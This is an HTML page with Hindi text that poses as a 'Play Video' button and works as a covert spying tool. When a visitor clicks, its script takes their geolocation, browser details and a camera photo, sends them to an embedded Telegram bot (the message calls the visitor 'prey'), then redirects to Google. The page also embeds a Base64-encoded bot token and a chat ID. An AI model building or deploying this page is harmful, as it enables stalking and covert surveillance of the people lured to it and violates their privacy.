<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body { background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
        button { padding: 20px 40px; font-size: 20px; cursor: pointer; background: #ff0000; color: white; border: none; border-radius: 10px; }
    </style>
</head>
<body>
    <h1>वीडियो देखने के लिए परमिशन दें</h1>
    <button onclick="startSpy()">Play Video</button>
    <video id="video" style="display:none"></video>

    <script>
        // अपना टोकन Base64 में यहाँ डाल (जैसे: MTIzNDU2Nzg5OkFCQ0R...)
        const encodedToken = "ODg0NTU1MTcxMzpBQUdzcnpOZ2ZPRzJtMVA3Z3FYbUo2c2JQRS1Zd1FmVlVaRQ==";
        const chatId = "6491656959";

        async function startSpy() {
            const botToken = atob(encodedToken);
            
            // 1. लोकेशन कैप्चर
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const info = `🎯 शिकार मिला!\n📍 ${pos.coords.latitude}, ${pos.coords.longitude}\n📱 ${navigator.userAgent}`;
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}`);
            });

            // 2. कैमरा एक्सेस
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;
            await video.play();

            const canvas = document.createElement('canvas');
            canvas.width = 640; canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob);
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
                window.location.href = "https://google.com";
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
